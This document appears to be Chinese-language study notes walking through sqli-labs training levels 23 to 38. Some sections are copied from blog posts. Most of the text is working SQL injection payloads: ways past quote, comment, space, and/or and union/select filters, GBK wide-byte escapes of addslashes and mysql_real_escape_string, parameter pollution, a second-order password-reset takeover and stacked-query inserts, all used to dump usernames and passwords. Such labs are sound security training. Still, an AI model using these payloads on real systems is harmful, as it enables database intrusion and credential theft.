如果需要注释符的提前闭合：提交`'[input] --+`形成`''[input] --+'limit 0,1`

那么我们可以使用单引号把后面的单引号提前闭合来不使用注释符，提交`'[input]'`形成：`''[input]''limit 0,1`



```
?id=-1' union select 1,2,3'
```

```
?id=-1' union select 1,database(),3'

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '

#注意可以加 or '1'= '

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users" or '1'= '

?id=-1'union select 1,(select concat(username,0x7e,password) from users limit 1,1),3'
```



![image-20220115195003908](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115195003908.png)

![image-20220115195052335](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115195052335.png)

![image-20220115195622036](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-注释符过滤.assets/image-20220115195622036.png)

![image-20220116185923881](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-注释符过滤.assets/image-20220116185923881.png)

![image-20220116191605733](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-注释符过滤.assets/image-20220116191605733.png)



或者使用url编码进行编码绕过






# less24

![image-20220115195744380](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-.assets/image-20220115195744380.png)

post提交



猜测：

![image-20220115195902065](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-.assets/image-20220115195902065.png)

![image-20220115195918333](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-.assets/image-20220115195918333.png)

用admin登录试试：

![image-20220115200009356](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-.assets/image-20220115200009356.png)

关于密码重置：

“增删改查”的“改”：

猜测写法：

```
$new_pass1 = $_POST['new_pass1'];
$new_pass2 = $_POST['new_pass2'];
if($new_pass1==$new_pass2)
{
update users set password='$new_pass' where username="$user" and password="&old_pass";
}
```

 

那么可以得到漏洞可能出现在：

`where username="$user" and `输入的username里



那么如果注册用户名：

`admin' #`

```
update users set password='123' where username='admin'  and password="&old_pass";
```

就可以通过自己修改密码去修改别人的密码。

——越权



新注册一个用户名：`admin' #` 密码随意

那么修改这个用户的密码时，其实就是修改的admin用户的密码



注册用户：

![image-20220115202224576](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-密码重置.assets/image-20220115202224576.png)

![image-20220115202248592](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-密码重置.assets/image-20220115202248592.png)

登录：

![image-20220115202342640](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-密码重置.assets/image-20220115202342640.png)

修改密码：

![image-20220115202409848](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-密码重置.assets/image-20220115202409848.png)

此时再登录admin账户就是修改后的密码

![image-20220115202500364](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less24-密码重置.assets/image-20220115202500364.png)






# less25

![image-20220115202646133](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25.assets/image-20220115202646133.png)

屏蔽了or 、and



![image-20220115202731431](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25.assets/image-20220115202731431.png)

单引号闭合



尝试：使用双写嵌套法、大小写绕过、URL编码等绕过

都被屏蔽了



因此：可以思考换种表达式：

and=&&

or=||

这里采用了黑名单验证的方法，将“or”和“AND”进行了匹配过滤，那么我们这里如何绕过呢？我们提供以下方法：

大小写变形，Or,OR,oR,OR,And,ANd,aND等

编码：hex,urlencode

在这两个敏感词汇中添加注释，例如：a/**/nd

利用符号替代————and --&&    or--||




```
?id=-1' union select 1,2,3 
```

![image-20220115203503297](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25-and和or.assets/image-20220115203503297.png)



![image-20220116085829590](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25-and和or.assets/image-20220116085829590.png)

注意双写嵌套：

![image-20220116090132331](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25-and和or.assets/image-20220116090132331.png)



![image-20220116090258922](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25-and和or.assets/image-20220116090258922.png)



![image-20220116090501095](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less25-and和or.assets/image-20220116090501095.png)

over






# less26

![image-20220115204738123](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-.assets/image-20220115204738123.png)



空格替代品：

`%09` 水平tab键

`%0a` 新建一行

`%0c` 新建一页

`%0d` return功能

`%0b` 垂直tab键

`%a0` 空格键

或者不要空格，用括号



【闭合单引号省略注释符】

如：

```
id=1%27||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))||1=%27
```



![image-20220116090834477](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-空格过滤.assets/image-20220116090834477.png)

单引号闭合



```
?id=1'||(extractvalue(1,concat(0x7e,(select(database())),0x7e)))||1='
```

![image-20220116094623658](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-空格过滤.assets/image-20220116094623658.png)



```
?id=1'||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoORrmation_schema.tables)where(table_schema="security")),0x7e)))||1='--+
```

![image-20220116131832053](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-空格过滤.assets/image-20220116131832053.png)



```
?id=1'||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoORrmation_schema.columns)where((table_schema="security")anandd(table_name="users"))),0x7e)))||1='--+
```

![image-20220116132551414](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-空格过滤.assets/image-20220116132551414.png)



```
?id=1'||(extractvalue(1,concat(0x7e,(select(substr(group_concat(username,0x7e,passwOorRd),1))from(users)),0x7e)))||1='--+
```

![image-20220116133551698](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less26-空格过滤.assets/image-20220116133551698.png)







# less27

测试：

![image-20220116134301235](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less27-union-select过滤.assets/image-20220116134301235.png)

单引号闭合



屏蔽了空格、负号、union、select

可以使用大小写、空格变换写法绕过

用 URL编码%0b 和 大小写union、select 进行绕过

内联注释/**/则是注释指定部分

```
/?id=10000000'%0buNion%0bsElect%0b1,2,3 ||  '1'='1

```

![image-20220116134430138](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less27-union-select过滤.assets/image-20220116134430138.png)

```
?id=10000000'%0buNion%0bsElect%0b1,database(),3 ||  '1'='1

?id=10000000'%0buNion%0bsElect%0b1,2,group_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema="security" || '1'= '1

?id=10000000'%0buNion%0bsElect%0b1,2,group_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema="security" || '1'= '1
```

![image-20220116140258302](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less27-union-select过滤.assets/image-20220116140258302.png)



```
?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/'1'='1

?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1，(SeLeCt/*%0a*/group_concat(table_name)/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema="security"),3||'1'='1

?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1，(group_concat(table_name)),3/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema="security"||'1

?id=0'%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema='security'%0bAnd%0btable_name='users'%0b%26%26%0b'1'='1

?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws('$',id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/'1'='1
```






# Less 28

 这一关是基于错误的，有括号的单引号字符型，过滤了union和select等的注入。

 

 爆库名：`?id=0')UNion%a0SElect%a01,database(),('1')=('1`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less28-unionselect单引号括号过滤.assets/1838411-20200210131401614-455447668.png)

 

 爆表名：`?id=0')UNion%a0SElect%a01,(group_concat(table_name)),3%a0from%a0information_schema.tables%a0where%a0table_schema='security'%a0%26%26%a0('1')=('1`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less28-unionselect单引号括号过滤.assets/1838411-20200210131453092-1826678474.png)

 

 爆列名：`?id=0')UNion%a0SElect%a01,(group_concat(column_name)),3%a0from%a0information_schema.columns%a0where%a0table_schema='security'%a0ANd%a0table_name='users'%a0%26%26%a0('1')=('1`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less28-unionselect单引号括号过滤.assets/1838411-20200210131701559-901783590.png)

 

 爆用户名密码：`?id=0')UNion%a0SElect%a01,(group_concat(username)),3%a0from%a0users%a0where%a0('1')=('1`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less28-unionselect单引号括号过滤.assets/1838411-20200210131741685-267550906.png)

 

 这是联合查询语句来做得。还可以用时间注入的方法。

比如`?id=1') %a0 %26%26 if( length(database())>1, 1, sleep(5)) ;%00`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less28-unionselect单引号括号过滤.assets/1838411-20200210133144229-464658923.png)

 



```
0')%0dunion%0dunion%0dselect%0dselect%0d1,2,3%0dor%0d('

0')%0dunion%0dunion%0dselect%0dselect%0d1,database(),3%0dor%0d('

0%27)%0dunion%0dunion%0dselect%0dselect%0d1,group_concat(table_name),3%0dfrom%0dinformation_schema.tables%0dwhere%0dtable_schema=%27security%27%0dor%0d(%27

0%27)%0dunion%0dunion%0dselect%0dselect%0d1,group_concat(column_name),3%0dfrom%0dinformation_schema.columns%0dwhere%0dtable_schema=%27security%27%0dand%0dtable_name=%27users%27%0dor%0d(%27

0%27)%0dunion%0dunion%0dselect%0dselect%0d1,(select%0dgroup_concat(password)%0dfrom%0dusers),3%0dor%0d(%271

 
```




# less29



这一关叫做基于WAF的一个错误。我们还是先做测试输入双引号正常，输入一个引号发生错误，两个引号正常。

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210135759414-2013636035.png)

 

 ![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210135816744-302273477.png)

 

 现在注入payload。爆库：`?id=-1' union select 1,2,database()--+`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210135935165-1896168566.png)

 

 爆表：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210140031138-1993887524.png)

 

 爆列：`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210140102165-570288047.png)

 

 爆用户名密码：`?id=-1' union select 1,2,group_concat(username,0x7e,password) from users--+`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210140135377-668664449.png)

 

 emmmm怎么说呢，就是感觉这一关太简单了。。又看了看别人的，具体可以试试。

可以看一下这个博客，http://blog.csdn.net/nzjdsds/article/details/77758824。

里面的jspstudy需要搭建环境jspstudy：https://www.xp.cn/download.html

利用tomcat与apache解析相同请求参数不同的特性，tomcat解析相同请求参数取第一个，而apache取第二个，如?id=1&id=2，tomcat取得1，apache取得2

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less29-.assets/1838411-20200210143113315-452148997.png)

 
 
 
 
 # less30



与29关一样。只是把sql的闭合变成了双引号。

爆用户名密码：`?id=1&id=0" union select 1,2,group_concat(username,0x7e,password) from users--+`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less30.assets/1838411-20200210143814736-1948507707.png)

 
 
 
 # less31

和前两关一样，只是闭合变成了，”） 



# less32

输入的东西被它自己添加的`\`转义，通过我们自己添加`\`无法绕过

MySQL用gbk编码，把2个字符当做一个汉字存在【中国的网站】

因为urlencode(\')=%5c%27

`id=1%df\'`

用`%df'`让它成为：`%df%5c`变成一个汉字，这样就可以使`'`逃逸出来

可变化，不一定`%df`

```
宽字节注入

mysql用gbk编码，把2个字符当作一个汉字存在
%df吃掉\，因为urlencode(\')= %5c%27，如果前面加上%df，%df%5c是一个汉字,%27会独立出来

id=-2%df' union select 1,2,3 --+

```



# Less 32

(https://www.cnblogs.com/linfangnan/p/13963425.html#1247611931)

## 判断注入类型

(https://www.cnblogs.com/linfangnan/p/13963425.html#2206060654)

注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。

```
Copy ?id=1'
```

[![img](less32-宽字节注入.assets/1774310-20201112130318514-992292406.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112130318514-992292406.png)
 对于一般的转义字符，我们是无法构造注入的 payload 的，但这并不代表网页就没有任何漏洞可以注入。对**宽字节注入漏洞**进行测试，注入如下参数。当数据库的编码采用 **GBK 国标码**时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。

```
Copy ?id=1%df'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112131405230-1236593570.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112131405230-1236593570.png)
 这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 SQL 查询了正确的参数(汉字)，从而可以使用 UNION 语句进行注入。

## 获取数据库信息

(https://www.cnblogs.com/linfangnan/p/13963425.html#2765876296)

使用单引号闭合时使用宽字节注入，其他步骤和 Less 1 差别不大。判断表有几列：

```
Copy ?id=1%df' ORDER BY 3--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112132103950-1495701596.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112132103950-1495701596.png)

```
Copy ?id=1%df' ORDER BY 4--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112132121053-1872758153.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112132121053-1872758153.png)
 判断哪几列可用。

```sql
Copy ?id=-1%df' UNION SELECT 1,2,3 --+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112132213485-1888390718.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112132213485-1888390718.png)
 爆数据库名。

```sql
Copy ?id=-1%df' UNION SELECT 1,database(),3 --+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112132250725-1723443195.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112132250725-1723443195.png)
 爆表名，注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。

```sql
Copy ?id=-1%df' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112132531385-1191565179.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112132531385-1191565179.png)
 爆字段名。

```sql
Copy ?id=-1%df' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=0x7365637572697479 and table_name=0x7573657273--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112133009556-2123094608.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112133009556-2123094608.png)

## 获取目标信息

(https://www.cnblogs.com/linfangnan/p/13963425.html#283454690)

爆出用户名和密码，注意不要使用单引号来闭合字符串，改用十六进制编码。

```sql
Copy ?id=-1%df' UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less32-宽字节注入.assets/1774310-20201112133114198-1425925377.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201112133114198-1425925377.png)



 
 
 
 # Less 33
 
 (https://www.cnblogs.com/linfangnan/p/13963425.html#2517627581)

## 判断注入类型

(https://www.cnblogs.com/linfangnan/p/13963425.html#3006507982)

注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。

```
Copy ?id=1'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less33.assets/1774310-20201113234457989-129978972.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201113234457989-129978972.png)
 仍然使用 “%df” 和反斜杠的 URL 编码 “%5C” 闭合，进行宽字节注入。

```
Copy ?id=1%df'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less33.assets/1774310-20201113234740538-994020670.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201113234740538-994020670.png)
 把后面的内容注释掉，网页返回正常信息，说明此处使用单引号闭合。

```
Copy ?id=1%df'--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less33.assets/1774310-20201113234805865-1024588937.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201113234805865-1024588937.png)

## 获取目标信息

(https://www.cnblogs.com/linfangnan/p/13963425.html#3073750754)

注入的 payload 和 Less 32 完全一样，爆出用户名和密码。

```sql
Copy ?id=-1%df' UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less33.assets/1774310-20201113235116331-1857020334.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201113235116331-1857020334.png)










 # post宽字节注入

## less34

post宽字节注入

去burpsuite里提交数据包，与直接前端提交不同。



```
重要！
在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文

uname=admi%df' union select 1,2 #&passwd=admin&submit=Submit
```


```
Less - 34 Bypass Add SLASHES

（第34节：绕过添加斜杠）
Test:

    http://localhost/sqli-lab/Less-34/index.php
    
    1

注：编码为gbk的数据库+addslashes() 有一个关于编码的漏洞 加上斜杠以后的字符编码是%BF%5C%27和%FE%5C%27
Sourse Code：

$uname = addslashes($uname1);
$passwd= addslashes($passwd1);
mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
if($row){
     echo 'Your Login name:'. $row['username'];
     echo 'Your Password:' .$row['password'];
     echo '<img src="../images/flag.jpg"  />';   
}else{
     print_r(mysql_error());
     echo '<img src="../images/slap.jpg" />';   
}



Solution：

    uname=1%BF' or 1=1 #&passwd=1%BF' or 1=1 #&submit=Submit
    
    uname=1%FE' or 1=1 #&passwd=1%FE' or 1=1 #&submit=Submit
    
    其它：
    
    uname=1%Bf' union select version(),database() #&passwd=1%BF' or 1=1 #&submit=Submit
    
    uname=1%FE' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=1%FE' or 1=1 #&submit=Submit
    
    uname=1%FE' union select group_concat(username),group_concat(password) from security.users where 1 #&passwd=1%FE' or 1=1 #&submit=Submit
    

注：如果采用这种办法，还是一直报编码错误的话，建议自行检查 数据库 及 其中 表 的编码
————————————————
版权声明：本文为CSDN博主「战狼767」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_21500173/article/details/51965212
```


## 防御：

把数据库的编码方式改为Unicode






# Less 35

(https://www.cnblogs.com/linfangnan/p/13963425.html#4196250336)

## 判断注入类型

(https://www.cnblogs.com/linfangnan/p/13963425.html#3777657784)

注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。

```
Copy ?id=1'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less35.assets/1774310-20201114004418158-763185204.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114004418158-763185204.png)
 仍然使用 “%df” 和反斜杠的 URL 编码 “%5C” 闭合，进行宽字节注入。测试下面的所有参数都注入失败，那应该就是数值型注入。

```sql
Copy ?id=1%df'--+
?id=1%df')--+
?id=1%df'))--+
?id=1%df"--+
?id=1%df")--+
?id=1%df"))--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less35.assets/1774310-20201114004549784-386581616.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114004549784-386581616.png)
 直接用 ORDER BY 排序，网页回显正常数据，确定是数值型注入。由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设。

```
Copy ?id=1 ORDER BY 3--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less35.assets/1774310-20201114005012419-1799871890.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005012419-1799871890.png)

## 获取目标信息

(https://www.cnblogs.com/linfangnan/p/13963425.html#1024301976)

注入的 payload 和 Less 1 完全一样，爆出用户名和密码。

```sql
Copy ?id=-1 UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less35.assets/1774310-20201114005154044-330644705.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005154044-330644705.png)








# Less 36

(https://www.cnblogs.com/linfangnan/p/13963425.html#1991828870)

## 判断注入类型

(https://www.cnblogs.com/linfangnan/p/13963425.html#3974072103)

注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。

```
Copy ?id=1'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less36.assets/1774310-20201114005544874-820846061.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005544874-820846061.png)
 仍然使用 “%df” 和反斜杠的 URL 编码 “%5C” 闭合，进行宽字节注入。

```
Copy ?id=1%df'
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less36.assets/1774310-20201114005603530-343266515.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005603530-343266515.png)
 把后面的内容注释掉，网页返回正常信息，说明此处使用单引号闭合。

```
Copy ?id=1%df'--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less36.assets/1774310-20201114005623684-1561918381.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005623684-1561918381.png)

## 获取目标信息

(https://www.cnblogs.com/linfangnan/p/13963425.html#3532792004)

注入的 payload 和 Less 32 完全一样，爆出用户名和密码。

```sql
Copy ?id=-1%df' UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```

[![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less36.assets/1774310-20201114005640709-1934547604.png)](https://img2020.cnblogs.com/blog/1774310/202011/1774310-20201114005640709-1934547604.png)

## 网页源码

(https://www.cnblogs.com/linfangnan/p/13963425.html#689306191)

### SQL 查询语句

(https://www.cnblogs.com/linfangnan/p/13963425.html#3187709466)

此处用于过滤的函数是 check_quotes() 函数。

```
Copy $id = check_quotes($_GET['id']);

mysql_query("SET NAMES gbk");
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
```

### check_quotes() 函数

(https://www.cnblogs.com/linfangnan/p/13963425.html#3554153480)

过滤函数是 **mysql_real_escape_string() 函数**，它用于转义 SQL 语句中使用的字符串中的特殊字符。特殊字符有：\x00、\n、\r、\、'、"、\x1a。

```
Copy function check_quotes($string)
{
      $string = mysql_real_escape_string($string);    
      return $string;
}
```








```
Less - 37 MySQL_real_escape_string

（第37节：MySQL_real_escape_string ）
Test:

    http://localhost/sqli-lab/Less-38/index.php 
        uname=2'&passwd=1'&submit=Submit
    
  
注：失败，没有SQL查询报错
Sourse Code：



    mysql_query("SET NAMES gbk");
    @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row){
        echo 'Your Login name:'. $row['username'];
        echo 'Your Password:' .$row['password'];
        echo '<img src="../images/flag.jpg"  />';   
    }else{
        print_r(mysql_error());
        echo '<img src="../images/slap.jpg" />';   
    }

Solution：

    uname=2%FE' or 1=1  #&passwd=1%FE' or 1=1 #&submit=Submit
    
    其它：
    
    uname=1%FE' union select version(),database() #&passwd=1%FE' or 1=1 #&submit=Submit
    
    uname=1%FE' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=1%FE' or 1=1 #&submit=Submit
    
    uname=1%FE' union select group_concat(username),group_concat(password) from security.users where 1 #&passwd=1%FE' or 1=1 #&submit=Submit


————————————————
版权声明：本文为CSDN博主「战狼767」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_21500173/article/details/51965212
```





# less38

PHPstudy

MySQL里`;`后面加上新的数据，那么它会新起一行，添加一条内容是新的数据。

用于已知其网站注册入口、SQL的结构等。

```
id=1';insert into users(username,password)values('zj123','xxxx') --+
```



